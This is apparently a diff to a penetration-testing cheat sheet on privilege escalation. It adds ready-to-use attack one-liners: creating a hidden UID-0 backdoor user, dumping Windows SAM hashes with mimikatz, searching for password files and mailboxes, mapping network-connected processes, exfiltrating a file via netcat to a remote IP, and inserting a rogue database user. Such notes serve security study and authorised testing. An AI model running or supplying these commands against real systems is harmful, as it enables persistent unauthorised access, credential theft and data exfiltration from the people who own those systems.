@@ -3,6 +3,12 @@
 * [Information to Gather for Privilege Escalation](#information-to-gather-for-privilege-escalation)
 * [Gathering Information on a Windows System](#gathering-information-on-a-windows-system)
 * [Gathering Information on a Linux System](#gathering-information-on-a-linux-system)
+* [One-liner: useradd and chpasswd](#one-liner-useradd-and-chpasswd)
+* [Dump Passwords](#dump-passwords)
+* [Find Password Files](#find-password-files)
+* [Find Emailboxes](#find-emailboxes)
+* [Get Network Connections](#get-network-connections)
+* [Exfil via Netcat](#exfil-via-netcat)
 
 ## Information to Gather for Privilege Escalation
 | Information | Benefit to Privilege Escalation |
@@ -40,4 +46,44 @@ hostname
 cat /etc/issue # print OS version
 cat /etc/*-release # print OS version
 uname -a # print kernel version and system architecture
+```
+
+## One-liner: useradd and chpasswd
+```bash
+useradd -p $(openssl passwd -crypt password) -s /bin/bash -o -u 0 -g 0 victor
+```
+
+## Dump Passwords
+```bash
+mimikatz.exe "lsadump::sam"
+```
+
+## Find Password Files
+```bash
+findstr /si password *.xml *.ini *.txt (Find passwords)
+```
+
+## Find Emailboxes
+```bash
+dir *.dbx /s 
+```
+
+## Get Network Connections
+```bash
+# all connections, no name resolution, and print owning PID 
+netstat -ano 
+
+# print filepath of each network-connected binary
+(Get-NetTcpConnection).OwningProcess | ForEach-Object { Get-Process -Id $_ | Select-Object -ExpandProperty Path } | Sort-Object | Get-Unique
+```
+
+## Exfil via Netcat
+```bash
+nc -nvlp 5050 > stolen.exe
+nc.exe -w3 10.11.12.13 5050 < stealme.exe
+```
+
+Add a new user to a SQL database
+```sql
+INSERT INTO targetdb.usertbl(username, password) VALUES ('victor','please');
 ```
